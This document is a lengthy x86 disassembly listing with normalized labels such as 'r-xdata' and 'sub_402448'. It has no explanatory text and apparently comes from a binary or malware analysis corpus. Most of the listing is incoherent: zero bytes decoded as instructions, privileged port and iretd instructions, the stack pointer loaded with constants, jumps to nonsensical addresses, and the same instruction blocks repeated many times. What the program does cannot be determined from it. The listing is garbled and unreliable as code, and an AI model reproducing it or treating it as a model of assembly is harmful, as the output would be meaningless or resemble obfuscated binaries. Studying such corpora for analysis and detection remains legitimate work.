jge 0xffffffff9c95c150
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402380
jne r-xdata
jne r-xdata
or ebx 0xfad7f58
adc [ ecx + 0x53 ] 0xff83e851
jg r-xdata
ja 0xcaa5ca
jno r-xdata
js 0x7f44e789
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop edx
pop edx
jne r-xdata
or esi 0xff24810f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
jns r-xdata
sub ebx 0xe8525452
insb
jae r-xdata
and esi 0x89641273
jg r-xdata
jns 0x158a7a6
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea79a
pop edx
jge r-xdata
jo 0xffffffff854f7cc3
add [ eax ] al
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_402380
jb 0xffffffff81b2a036
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop edx
jg r-xdata
and ecx 0xf04c483
xor al [ ecx ]
add [ eax ] al
sub eax 0x6c7315ff
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c12
jae r-xdata
and edx 0xff53830f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
and [ edx + 0xf000000 ] 0xffffff8d
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7ce
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
add esp 0x4
jg r-xdata
je 0xffffffff804f97e4
pop eax
ja r-xdata
xor edx 0x880f5e7f
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21c
jne r-xdata
sub edi 0x64244481
xchg ebp eax
sub [ eax ] al
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c331b4
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jge r-xdata
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jg r-xdata
sub edi 0xf681b871
jne r-xdata
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402226
jae 0xffffffffff43aa4b
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
push edx
push esp
push edx
call sub_40221b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jae r-xdata
mov ebp 0x478f0f5a
pop ecx
jno r-xdata
call 0xf44e9fd
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jg r-xdata
ja 0xffffffffff9ba471
pop ecx
jne r-xdata
jbe 0xffcf4c8
jno r-xdata
and ebx 0x870f4975
jno r-xdata
jge 0xffffffffffa0a807
jae r-xdata
xor esi 0xe681cd75
jge r-xdata
jpe 0x74cd340b
add esp 0x4
jae r-xdata
jl 0xf3a54c
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c45
add [ eax ] al
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e2
push 0x81ffffff
out 0x77 al
jne r-xdata
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc1
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
jae r-xdata
je 0xffffffffff6da893
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4023e4
pop ecx
ja r-xdata
push esi
push esi
sub esp 0x10
call sub_4024e1
xor edi 0x810a7d58
0xf59
mov esp 0xd5e85054
add [ eax ] al
add [ ecx - 0x17adae0f ] al
dec esp
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xchg [ edi ] cl
sub_402422
jae r-xdata
pop edx
pop eax
jg r-xdata
xor ecx 0x8c0fc977
jae r-xdata
jo 0x5866199b
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
add esp 0x4
jno r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d3
push esp
push eax
call sub_4024c8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13363
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402445
jg r-xdata
pop edx
pop edx
pop edx
jg r-xdata
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
pop eax
pop ecx
jae r-xdata
or edx 0xec830f
add [ eax ] al
xor ecx 0x8c0fc977
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jge r-xdata
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d3
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
pop eax
call [ 0xffffffffff37e857 ]
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
xor esi 0xac810f59
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
jae r-xdata
jo 0x5866199b
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
add esp 0x4
jno r-xdata
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13363
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
push esp
push eax
call sub_4024c8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402448
jg r-xdata
pop eax
jge r-xdata
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
add esp 0x4
jae r-xdata
or edx 0xc7810f59
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jne r-xdata
add edx 0xfee48d0f
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d3
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jge r-xdata
xor esi 0xac810f59
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_40245f
jne r-xdata
jae r-xdata
or ecx 0xa38d0f
add [ eax ] al
pop edx
add esp 0x4
jns 0x119aba2
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd340b
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d3
jae r-xdata
add eax 0x4c4835a
jae r-xdata
jo 0x5866199b
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
add esp 0x4
jno r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4024c8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13363
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402478
pop ecx
pop edx
ja r-xdata
pop eax
pop ecx
jns r-xdata
mov esi 0x790cc483
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
add eax 0x4c4835a
jae r-xdata
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
ja r-xdata
add edi 0xff74830f
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13363
jl 0xffffffffc1c157a5
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add [ eax ] al
add [ edi ] cl
pop ecx
pop eax
ja r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jae r-xdata
jo 0x5866199b
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
add esp 0x4
jno r-xdata
iretd
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
xchg [ edi ] cl
push esp
push eax
call sub_4024c8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b322
add [ eax ] al
jno 0xf9a7e75
sub_402481
add esp 0xc
jns r-xdata
pop eax
pop ecx
sub eax 0xbb830f
add [ eax ] al
jns 0x119aba2
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd340b
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d3
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jge r-xdata
jns r-xdata
xor esi 0xac810f59
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4024c8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13363
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_4024c8
pop edx
add esp 0x4
jne r-xdata
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
xor edi 0xaae85157
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
add esp 0x4
jno r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4024c8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d3
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13363
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
jo 0xffffffff894f7e89
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_4024e1
jae r-xdata
jne r-xdata
sub ecx 0xe89c579c
jb r-xdata
jne r-xdata
sub edi 0x4c4835a
jne r-xdata
pop edx
pop ecx
pop eax
jae r-xdata
mov ecx 0xf6811c75
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
xor edi 0xaae85157
jg r-xdata
add esi 0x808f0f5a
add [ eax ] al
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd340b
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
jg r-xdata
jno 0xf9a7e75
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push edi
push ecx
call sub_402481
add edx 0xff05e852
jne 0xffffffffc2c15285
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
add esp 0x4
jno r-xdata
push ebp
pushfd
push eax
pushfd
add ebx 0xdc7f585a
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4024c8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d3
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13363
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
jo 0xffffffff894f7e89
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
